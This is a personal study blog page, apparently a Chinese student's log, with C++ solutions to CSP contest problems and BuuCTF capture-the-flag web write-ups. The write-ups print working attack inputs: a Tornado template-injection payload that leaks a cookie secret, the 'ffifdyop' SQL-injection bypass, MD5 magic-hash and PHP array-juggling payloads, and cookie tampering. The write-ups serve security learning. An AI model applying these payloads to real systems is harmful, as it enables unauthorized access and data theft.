<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>qinyiwen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="qinyiwen">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="qinyiwen">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qinyiwen</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-20240223" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/23/20240223/" class="article-date">
  <time class="dt-published" datetime="2024-02-23T09:15:29.000Z" itemprop="datePublished">2024-02-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/23/20240223/">20240222</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="2023-5-1-重复局面"><a href="#2023-5-1-重复局面" class="headerlink" title="2023-5-1 重复局面"></a>2023-5-1 重复局面</h5><p>本题的主要思想是读取n个8个字符串的组合，统计每个组合在数组中出现的次数并输出。</p>
<p>首先从标准输入中读取一个整数n，然后定义了一个字符串数组xq，长度为101。接着使用两个嵌套的for循环，将每次循环中读取的8个字符串s依次添加到xq数组中的第i个位置。接着定义一个整数num，用来记录当前字符串在数组中出现的次数。然后再次使用一个循环遍历之前已经存储的字符串，如果有和当前字符串相同的，则num加1。最后输出num的值，表示当前字符串在数组中出现的次数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,i,j;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    string xq[<span class="number">101</span>],s;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;s;</span><br><span class="line">            xq[i]+=s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> num=<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(xq[j]==xq[i]) num++;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;num&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2023-3-1-田地丈量"><a href="#2023-3-1-田地丈量" class="headerlink" title="2023-3-1 田地丈量"></a>2023-3-1 田地丈量</h5><p>这道题的思想是计算n个矩形区域和给定区域(a,b)的交集总面积。</p>
<p>首先从标准输入中读取三个整数n，a，b。然后使用一个循环读取n组四个整数x1，y1，x2，y2。这四个整数表示一个矩形区域的左下角和右上角的坐标。在每次循环中，通过比较输入的矩形区域和给定的区域(a,b)是否有交集，如果有交集，则计算两个矩形区域的交集面积并累加到sum变量中。计算交集面积的方法是通过计算两个矩形区域在x和y轴上的重合部分的长度，然后相乘得到交集面积。最后输出sum变量的值，表示所有矩形区域和给定区域(a,b)的交集总面积。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,a,b,i,j,x1,x2,y1,y2,sum=<span class="number">0</span>;;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2;</span><br><span class="line">        <span class="comment">//if((x1&lt;a &amp;&amp; y1&lt;b) || (x2&gt;0 &amp;&amp; y2&gt;0) || (x1&lt;a &amp;&amp; y2&gt;0) || (x2&gt;0 &amp;&amp; y1&lt;b)) //有交集</span></span><br><span class="line">        <span class="comment">//&#123;</span></span><br><span class="line">        <span class="type">int</span> x=<span class="built_in">min</span>(x2,a)-<span class="built_in">max</span>(x1,<span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> y=<span class="built_in">min</span>(y2,b)-<span class="built_in">max</span>(y1,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;<span class="number">0</span>&amp;&amp;y&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=x*y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//sum+=x*y;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="21、easy-tornado"><a href="#21、easy-tornado" class="headerlink" title="21、easy_tornado"></a>21、easy_tornado</h5><p>题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2" alt="image"></p>
<p>查看&#x2F;fllllllllllllag，显示Error</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9a24200a-c33a-4ec5-b86a-0f598b975988" alt="image"></p>
<p>并且url变成了&#x2F;error?msg&#x3D;Error</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb555e51-15cf-4a34-ab56-50f0446c84f2" alt="image"></p>
<p>查看&#x2F;welcome.txt，内容为render</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b813424-aff6-4218-b808-4b0d4b8d3426" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure>

<p>查看&#x2F;hints.txt，这是一个加密方法，猜测 要构造<code>filename=/fllllllllllllag&amp;filehash=？</code></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812150637958.png" alt="image-20230812150637958"></p>
<p>在查阅资料后发现Error就是注入点</p>
<p>本题是模板注入<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入 - 简书 (jianshu.com)</a></p>
<p>参考资料<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bwangel23/p/4858870.html">Tornado小记 – 模板中的Handler - 黑翼天使23 - 博客园 (cnblogs.com)</a></p>
<p>获取handler.settings环境变量：<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>得到cookie_secret</p>
<p><code>&#39;cookie_secret&#39;: &#39;caffff81-323f-48da-8323-dc1530a0c95d&#39;</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/32f7ab16-b8c5-4a51-acb3-1c4202250294" alt="image"></p>
<p>编写脚本</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def Md5(x):</span><br><span class="line">    md5 = hashlib.md5(str(x).encode(&quot;utf8&quot;)).hexdigest()</span><br><span class="line">    return md5</span><br><span class="line">    </span><br><span class="line">print(Md5(&quot;caffff81-323f-48da-8323-dc1530a0c95d&quot;+Md5(&quot;/fllllllllllllag&quot;)))</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a033cbb8-a253-4db8-bf82-8ddf811a549c" alt="image"></p>
<p>构造<code>/file?filename=/fllllllllllllag&amp;filehash=7d14388e78d85a8f1e726052e9d4dfbd</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f83150e-3dd7-4d3a-89b2-1b63b92c9691" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5673c2e4-27f7-4962-8d87-f449b8069952&#125;</span><br></pre></td></tr></table></figure>

<h5 id="22、admin"><a href="#22、admin" class="headerlink" title="22、admin"></a>22、admin</h5><p>注册一个账号</p>
<p>由于题目叫admin，所以注册时直接用admin了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
<p>显示用户名已经被注册过</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
<p>注册一个账号</p>
<p>由于题目叫admin，所以注册时直接用admin了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
<p>显示用户名已经被注册过</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
<p>猜密码</p>
<p>用123登陆成功了。。。</p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812171109196.png" alt="image-20230812171109196"></p>
<p>在网上看大佬解题思路</p>
<p>注册</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0dc1b0d0-bc52-4352-a081-27b2a6b5f2f7" alt="image"></p>
<p>登录，右侧依次查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d87e4454-5a16-4fea-9512-9bef90f01a9c" alt="image"></p>
<p>在change password的源代码中看到一个被注释的链接</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bc16f3dc-36de-4130-885a-8334541c24ee" alt="image"></p>
<p>访问这个链接，内容已被删除，所以就没再看了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1fe4d77-4ed1-4c7b-a261-dbf716519595" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88c07276-46ea-4e23-a50d-ce722b067e0f&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/23/20240223/" data-id="clsy5a9jx0000fovf5d2148pw" data-title="20240222" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240222" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/22/20240222/" class="article-date">
  <time class="dt-published" datetime="2024-02-22T08:07:22.000Z" itemprop="datePublished">2024-02-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/22/20240222/">20240222</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="2023-9-1-坐标变换（其一）"><a href="#2023-9-1-坐标变换（其一）" class="headerlink" title="2023-9-1 坐标变换（其一）"></a>2023-9-1 坐标变换（其一）</h5><p>简单的坐标平移操作。首先从输入中读取两个整数n和m，表示有n组坐标点和m组平移向量。然后通过一个循环读取n组坐标点的x和y坐标，并将它们的和分别累加到sumx和sumy中。接着再通过一个循环读取m组平移向量的x和y坐标，将它们分别加上sumx和sumy，得到新的x和y坐标，最后输出这两个新坐标。通过这个操作，实现了将n组坐标点进行平移的功能。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m,i,sumx=<span class="number">0</span>,sumy=<span class="number">0</span>,x,y;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        sumx+=x;</span><br><span class="line">        sumy+=y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        x+=sumx;</span><br><span class="line">        y+=sumy;</span><br><span class="line">        cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2023-9-2-坐标变换（其二）"><a href="#2023-9-2-坐标变换（其二）" class="headerlink" title="2023-9-2 坐标变换（其二）"></a>2023-9-2 坐标变换（其二）</h5><p>二维坐标变换。首先从输入中读取两个整数n和m，表示有n个变换操作和m组坐标点需要进行变换。然后使用两个vector数组k和xt分别存储变换系数和坐标偏移量。接着通过一个循环读取n个变换操作，每个操作包含一个整数x和一个浮点数cz，根据x的值来更新变换系数k和坐标偏移量xt。最后通过一个循环读取m组坐标点和两个整数cz1和cz2，根据之前计算的变换系数和坐标偏移量，对坐标点进行线性变换，然后输出变换后的坐标点。</p>
<p>注意：</p>
<p>在C++中，<code>fixed</code>和<code>setprecision(3)</code>是用来设置输出浮点数的格式和精度的。具体说明如下：</p>
<ul>
<li><code>fixed</code>：指定浮点数的输出格式为固定小数点表示。即输出的浮点数将以小数点表示，而不是科学计数法。</li>
<li><code>setprecision(3)</code>：指定浮点数的输出精度为3位小数。即输出的浮点数将保留3位小数。</li>
</ul>
<p>在代码中，<code>cout&lt;&lt;fixed&lt;&lt;setprecision(3)</code>的作用是设置之后输出的浮点数都将采用固定小数点表示，并保留3位小数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">k</span><span class="params">(<span class="number">100005</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">xt</span><span class="params">(<span class="number">100005</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="type">double</span> cz;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;cz;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            k[i]=k[i<span class="number">-1</span>]*cz;</span><br><span class="line">            xt[i]=xt[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            k[i]=k[i<span class="number">-1</span>];</span><br><span class="line">            xt[i]=xt[i<span class="number">-1</span>]+cz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> cz1,cz2;</span><br><span class="line">        <span class="type">double</span> x,y;</span><br><span class="line">        cin&gt;&gt;cz1&gt;&gt;cz2&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="type">double</span> bs=k[cz2]/k[cz1<span class="number">-1</span>];</span><br><span class="line">        <span class="type">double</span> ds=xt[cz2]-xt[cz1<span class="number">-1</span>];</span><br><span class="line">        cout&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">3</span>)&lt;&lt;(x*<span class="built_in">cos</span>(ds)-y*<span class="built_in">sin</span>(ds))*bs&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(x*<span class="built_in">sin</span>(ds)+y*<span class="built_in">cos</span>(ds))*bs&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="19、BuyFlag"><a href="#19、BuyFlag" class="headerlink" title="19、BuyFlag"></a>19、BuyFlag</h5><p>查看源代码，发现有两个php文件链接，点击一个查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2d01e952-8e74-4151-bf1d-d2c66d2400dd" alt="image"></p>
<p>点击右边的菜单，有PAYFLAG，点击查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2fb29ae2-8d79-4bd8-9f13-4a171e8223f0" alt="image"></p>
<p>出现这段话</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b7ce3c6-69b4-4f52-8eb8-ddb32dbcb43e" alt="image"></p>
<p>查看源代码，用POST的方式传参，money&#x3D;100000000，password&#x3D;404，但是password不能为数字，所以password等于404+任意字符</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a6c6e305-19c0-4d40-9ded-1f61d8e1f0b3" alt="image"></p>
<p>前面提示必须是cuit的学生，所以修改cookie里的<code>user=0</code>为<code>user=1</code></p>
<p>修改uesr&#x3D;0为user&#x3D;1，页面变了，提示输入password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/19f46d7a-f13d-46d8-943e-edcdcdf53c93" alt="image"></p>
<p>post传参，password&#x3D;404a&amp;money&#x3D;100000000，提示数字太长</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d96f999-4b00-4463-92d1-181397975739" alt="image"></p>
<p>尝试次方 1e9，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db1ef7c7-60e1-4e0d-8d2c-56f9c5a535ce" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2eaf1e59-0556-4816-b343-80a3466e934e&#125; </span><br></pre></td></tr></table></figure>

<h5 id="20、Easy-MD5"><a href="#20、Easy-MD5" class="headerlink" title="20、Easy MD5"></a>20、Easy MD5</h5><p>查看源代码，找不到有用的信息，抓包</p>
<p>看到有一个提示：<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5f427204-8f49-423a-9536-6d0cbe3e0761" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br><span class="line"></span><br><span class="line">string	必需，规定要计算的字符串。</span><br><span class="line"></span><br><span class="line">raw	可选，规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式；FALSE - 默认。32 字符十六进制数</span><br><span class="line"></span><br><span class="line">需要构造or来绕过password，md5(ffifdyop,true)=&#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line"></span><br><span class="line">原sql查询语句则变为select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&#x27;即可绕过</span><br><span class="line"></span><br><span class="line">类似的字符串还有:md5(129581926211651571912466741651878684928,true)=\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>

<p>输入ffifdyop</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bce80f81-80f9-4529-b511-47c0fca9a2c9" alt="image"></p>
<p>提交</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7dfe98f9-5a49-4a6b-b599-3bfca11b40dc" alt="image"></p>
<p>查看源代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24807ed6-347a-4351-87d5-655f11e62061" alt="image"></p>
<p>用get传参，满足a!&#x3D;b且md5(a)&#x3D;md5(b)</p>
<p>md5加密后的值开头为0E，则说明它们的值相等</p>
<p>payload：<code>/levels91.php?a=s878926199a&amp;b=s155964671a</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/516f5189-c10d-4d47-ba7b-ed8b0f44666b" alt="image"></p>
<p>包含flag.php文件</p>
<p>用post传参，满足param1!&#x3D;param2且md5(param1)&#x3D;md5(param2)</p>
<p>这里用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false&#x3D;&#x3D;false成立使条件成立。</p>
<p><code>param1[]=1&amp;param2[]=2</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c26e0f72-c8ef-41ec-8d13-81b973edde69" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5699128f-b8b5-4580-9e90-8ab95639eb15&#125; </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/22/20240222/" data-id="clswyrd4z0000pcvf6nbe8tn3" data-title="20240222" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240221" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/21/20240221/" class="article-date">
  <time class="dt-published" datetime="2024-02-21T12:33:36.000Z" itemprop="datePublished">2024-02-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/21/20240221/">20240221</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="3的幂"><a href="#3的幂" class="headerlink" title="3的幂"></a>3的幂</h5><p>判断一个整数是否是3的幂。首先对输入的整数进行判断，如果小于等于0则直接返回false。然后对输入的整数进行循环除以3的操作，直到除以3得到的结果为1为止。在循环过程中，如果发现余数不为0则返回false，表示输入的整数不是3的幂。最终如果循环结束，说明输入的整数是3的幂，返回true。</p>
